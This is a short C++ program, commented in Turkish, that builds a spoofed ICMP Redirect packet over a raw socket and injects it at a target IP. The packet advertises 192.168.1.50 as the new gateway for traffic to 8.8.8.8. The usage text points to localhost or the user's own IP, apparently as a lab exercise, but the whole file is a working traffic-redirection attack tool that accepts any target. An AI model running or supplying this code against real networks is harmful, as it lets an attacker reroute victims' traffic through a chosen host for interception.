#include <iostream>
#include <cstring>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <arpa/inet.h>
#include <unistd.h>

// Standart Checksum Hesaplama
unsigned short calculate_checksum(void *b, int len) {
    unsigned short *buf = (unsigned short *)b;
    unsigned int sum = 0;
    unsigned short result;
    for (sum = 0; len > 1; len -= 2) sum += *buf++;
    if (len == 1) sum += *(unsigned char *)buf;
    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);
    result = ~sum;
    return result;
}

int main(int argc, char *argv[]) {
    if (argc != 2) {
        std::cerr << "Kullanım: " << argv[0] << " <Hedef IP (Localhost veya Kendi IP'niz)>" << std::endl;
        return 1;
    }

    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
    if (sock < 0) {
        perror("Socket hatası (Root yetkisi?)");
        return 1;
    }

    struct sockaddr_in dest_addr;
    dest_addr.sin_family = AF_INET;
    inet_pton(AF_INET, argv[1], &dest_addr.sin_addr);

    // --- PAKET OLUŞTURMA ---
    char packet[1024];
    memset(packet, 0, sizeof(packet));

    // 1. ICMP BAŞLIĞI (TYPE 5 - REDIRECT)
    struct icmp *icmp_hdr = (struct icmp *)packet;
    icmp_hdr->icmp_type = ICMP_REDIRECT; // TYPE 5
    icmp_hdr->icmp_code = 1;             // Code 1: Redirect Datagram for the Host
    
    // ÖNEMLİ: Redirect mesajında "Daha İyi Router"ın IP adresi burada belirtilir.
    // Sanki Router diyor ki: "Bana değil, 192.168.1.50'ye git."
    inet_pton(AF_INET, "192.168.1.50", &icmp_hdr->icmp_gwaddr); 

    // 2. ORİJİNAL IP BAŞLIĞI
    // Hangi paket yüzünden redirect veriyoruz? (Örn: 8.8.8.8'e giden bir paket)
    struct ip *orig_ip = (struct ip *)(packet + 8); // ICMP header sonrası
    orig_ip->ip_hl = 5;
    orig_ip->ip_v = 4;
    orig_ip->ip_tos = 0;
    orig_ip->ip_len = htons(28); 
    orig_ip->ip_id = htons(1111);
    orig_ip->ip_off = 0;
    orig_ip->ip_ttl = 64;
    orig_ip->ip_p = IPPROTO_TCP; // TCP paketi atmışız gibi
    inet_pton(AF_INET, argv[1], &orig_ip->ip_src);   // Kaynak: Biz
    inet_pton(AF_INET, "8.8.8.8", &orig_ip->ip_dst); // Hedef: Google DNS

    // Paketin toplam boyutu
    int packet_len = 8 + 20;

    // Checksum hesapla
    icmp_hdr->icmp_cksum = calculate_checksum(packet, packet_len);

    // --- GÖNDERME ---
    std::cout << "Redirect (Type 5) Paketi Gönderiliyor -> " << argv[1] << std::endl;
    std::cout << "Önerilen Yeni Router (Gateway): 192.168.1.50" << std::endl;

    if (sendto(sock, packet, packet_len, 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr)) <= 0) {
        perror("Gönderme hatası");
    } else {
        std::cout << "Paket başarıyla enjekte edildi." << std::endl;
    }

    close(sock);
    return 0;
}
